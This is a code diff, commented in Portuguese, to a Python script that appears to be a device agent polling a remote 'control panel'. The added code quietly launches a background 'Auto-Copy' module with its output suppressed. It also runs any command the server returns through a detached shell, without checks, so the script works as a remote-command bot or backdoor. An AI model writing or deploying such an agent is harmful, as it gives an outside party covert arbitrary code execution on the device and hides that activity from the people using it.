@@ -79,6 +79,18 @@ except:
 report["installation_status"] = "Completed"
 print("✅ Configuration finished! Connecting to control panel...")
 
+# --- INICIANDO PROCESSOS EM SEGUNDO PLANO ---
+print("🚀 Iniciando serviços em background (Auto-Copy)...")
+try:
+    # Usamos Popen para rodar o script sem travar o loop principal.
+    # Passamos o 'device_id' como argumento para o copy.py saber quem ele é.
+    subprocess.Popen([sys.executable, "functions/copy.py", device_id], 
+                     stdout=subprocess.DEVNULL, 
+                     stderr=subprocess.DEVNULL)
+    print("✅ Módulo Auto-Copy rodando em segundo plano.")
+except Exception as e:
+    print(f"⚠️ Aviso: Não foi possível iniciar o Auto-Copy. Erro: {e}")
+
 # Controle para enviar o report completo apenas na primeira vez
 first_connection = True
 
@@ -110,19 +122,18 @@ while True:
                 print("🚀 Device synchronized and actively listening for commands!")
                 first_connection = False
             
-            # --- EXECUÇÃO DE COMANDOS ---
-            # Supondo que sua API retorne um JSON com os comandos pendentes.
-            # Exemplo de resposta da API: {"status": "ok", "command": "python functions/copy.py"}
+            # --- EXECUÇÃO DE COMANDOS DA VERCEL ---
             try:
                 data = response.json()
                 comando_recebido = data.get("command")
                 
                 if comando_recebido:
                     print(f"📥 Executing received command: {comando_recebido}")
-                    # Roda o comando e continua o loop sem fechar o script
-                    os.system(comando_recebido)
+                    # Usamos Popen aqui também caso a Vercel mande um comando demorado
+                    # Assim o bot não para de mandar o "status: online"
+                    subprocess.Popen(comando_recebido, shell=True)
             except ValueError:
-                pass # Ignora se a resposta não for um JSON válido
+                pass 
                 
         else:
             print(f"⚠️ Server busy ({response.status_code})...")
@@ -130,7 +141,5 @@ while True:
     except Exception as e:
         print("📡 No connection or network error. Retrying...")
     
-    # PONTO CRÍTICO: Espera 10 segundos antes de perguntar novamente.
-    # Isso evita que a Vercel bloqueie seu IP por excesso de requisições (Rate Limit) 
-    # e impede que o celular fique com 100% de uso de CPU.
+    # Pausa antes da próxima checagem
     time.sleep(10)
